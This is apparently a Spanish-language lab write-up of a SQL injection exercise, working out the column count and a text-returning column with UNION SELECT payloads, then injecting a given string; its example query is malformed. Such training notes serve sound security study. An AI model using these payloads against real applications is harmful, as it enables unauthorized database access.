## Objetivo:

![[Pasted image 20240622152010.png]]

## Solución:

Seleccionamos una categoria

![[Pasted image 20240622152033.png]]


Suponiendo que la query esta asi
```
SELECT * FROM categories FROM category 'prueba';
```

Primero trataremos de averiguar cuantas columnas tiene dicha query utilizando ataque de tipo UNION

```
' UNION SELECT NULL, NULL--
```

![[Pasted image 20240622152344.png]]

```
' UNION SELECT NULL, NULL, NULL--
```

Vemos que tiene 3

![[Pasted image 20240622152414.png]]

Ahora para saber el tipo de dato que devuelve dicha columna intentaremos de la siguiente manera

```
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```

Siempre basandonos en el mensaje de error

![[Pasted image 20240622152538.png]]

Y como vemos en es la columna 2

![[Pasted image 20240622152603.png]]

Ahora como vemos en la prueba me dicen que tengo que usar el string "twQctj"... Entonces quitaremos la letra "a" y usaremos ese

![[Pasted image 20240622152644.png]]

